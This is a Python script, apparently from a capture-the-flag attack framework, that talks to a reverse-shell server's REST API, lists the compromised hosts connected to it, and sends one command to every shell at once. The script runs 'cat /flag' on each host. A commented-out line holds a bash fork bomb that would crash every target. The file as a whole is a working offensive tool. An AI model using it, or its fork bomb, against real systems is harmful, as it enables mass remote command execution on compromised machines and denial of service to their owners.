#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2020/9/18 14:10
# @Author  : Dawnnnnnn
# @Contact: 1050596704@qq.com
import requests
import hashlib
from config.config import reverse_shell_server_api
from framework.attack_framework import logger


class Batch:
    def __init__(self):
        self.clients = []
        self.ping()
        self.get_clients()
        if self.clients:
            pass
        else:
            logger.error(f'没有shell在线...')
            exit()

    @staticmethod
    def calc_md5(string):
        hash = hashlib.md5()
        hash.update(string.encode('utf-8'))
        sign = hash.hexdigest()
        return sign

    @staticmethod
    def ping():
        url = f"http://{reverse_shell_server_api}/client"
        try:
            requests.get(url, timeout=2)
        except BaseException:
            logger.error(f'连接不到Rest API服务器')
            exit()

    def get_clients(self):
        url = f"http://{reverse_shell_server_api}/client"
        res = requests.get(url)
        if res.status_code == 200:
            msg = res.json()['msg']
            for i in range(0, len(msg)):
                self.clients.append(msg[i])
        else:
            logger.error(f'获取客户端数据失败，请手动排查\n{res.text}')
            exit()

    def cmd(self, client, command):
        url = f"http://{reverse_shell_server_api}/client/{self.calc_md5(client)}"
        data = {
            "cmd": command
        }
        response = requests.post(url, data=data, timeout=5)
        if response.status_code == 200:
            return response
        else:
            logger.error(f"客户端[{client}]执行[{command}]出错:\n{response.text}")
            return False

    def cmd_batch(self, command):
        for i in range(0, len(self.clients)):
            client = self.clients[i]
            try:
                response = self.cmd(client, command)
                if response:
                    msg = response.json()['msg'].strip()
                    logger.info(f"客户端[{client}]执行[{command}]结果:\n{msg}")
            except BaseException as e:
                logger.error(f"客户端[{client}]执行[{command}]出错:\n{e}")


Batch().cmd_batch(command='cat /flag')
# Batch().cmd_batch(command=":(){:|:&};:")
